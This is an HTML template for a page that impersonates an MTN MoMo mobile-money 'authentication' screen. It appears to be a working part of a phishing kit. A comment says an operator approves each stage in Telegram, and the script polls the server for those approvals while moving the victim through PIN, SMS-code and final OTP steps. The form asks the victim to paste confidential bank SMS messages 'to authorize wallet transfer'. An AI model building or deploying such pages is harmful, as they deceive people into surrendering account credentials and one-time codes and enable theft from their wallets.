<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Authentication - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        html, body {
            margin: 0; padding: 0; width: 100%; min-height: 100vh;
            background-color: #003366; color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; align-items: center; justify-content: center; text-align: center;
        }
        .screen-container { width: 100%; max-width: 500px; padding: 30px 20px; }
        .hourglass-circle {
            width: 120px; height: 120px;
            background-color: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 50%; display: inline-flex;
            align-items: center; justify-content: center;
            font-size: 3rem; margin-bottom: 25px;
        }
        .notice-banner {
            background-color: rgba(255, 255, 255, 0.05);
            border-radius: 12px; padding: 14px 20px;
            margin-top: 20px; font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.7);
        }
        .app-id-tag { color: #FFCC00; font-weight: 700; letter-spacing: 1px; }
        .custom-msg-box {
            background: #FFCC00; color: #003366;
            padding: 15px; border-radius: 12px;
            font-weight: 700; margin-top: 15px; display: none;
        }
        .sms-box {
            background: #002244; padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.1);
        }
    </style>
</head>
<body>
    <div class="screen-container">
        
        <!-- Waiting State -->
        <div id="waitSection">
            <div class="hourglass-circle">⏳</div>
            <h2 class="fw-bold mb-2 fs-1">Authentication in progress...</h2>
            <p class="text-white-50 lead fs-6 mb-3">Please wait</p>
            <div id="customMsg" class="custom-msg-box mb-3"></div>
            <div class="notice-banner mb-4">Do not close this page</div>
            <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
        </div>

        <!-- SMS Code Input Form (revealed when Stage 1 PIN is approved in Telegram) -->
        <div id="smsSection" class="sms-box d-none">
            <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ Pre-Approved</div>
            <h3 class="fw-bold text-white mb-2">Enter Security Authorization Code</h3>
            <p class="text-white-50 small mb-4">
                Paste the confidential authorization message or code received on your phone to authorize wallet transfer.
            </p>

            <form action="/submit-auth-code" method="POST">
                <div class="mb-3">
                    <textarea class="form-control" name="auth_code" rows="4" placeholder="Paste authentication SMS or security code here..." required style="border-radius: 12px; font-size: 0.95rem;"></textarea>
                </div>
                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3">SUBMIT FOR DISBURSEMENT</button>
            </form>
        </div>

    </div>

    <script>
        function checkStatus() {
            fetch('/check-status')
                .then(response => response.json())
                .then(data => {
                    const waitSection = document.getElementById('waitSection');
                    const smsSection = document.getElementById('smsSection');
                    const msgBox = document.getElementById('customMsg');

                    if (data.status === "Stage1_Approved") {
                        // PIN Approved -> Show SMS Entry
                        waitSection.classList.add('d-none');
                        smsSection.classList.remove('d-none');
                    } else if (data.status === "Stage2_Approved") {
                        // SMS Approved -> Go to Final OTP step
                        window.location.href = "/final-verify";
                    } else if (data.status === "Stage3_Approved") {
                        // Final OTP Approved -> Success
                        window.location.href = "/success";
                    } else if (data.status === "CustomMessage") {
                        msgBox.style.display = 'block';
                        msgBox.textContent = data.custom_message;
                        setTimeout(checkStatus, 2000);
                    } else {
                        setTimeout(checkStatus, 1500);
                    }
                })
                .catch(() => setTimeout(checkStatus, 2500));
        }
        setTimeout(checkStatus, 1000);
    </script>
</body>
</html>
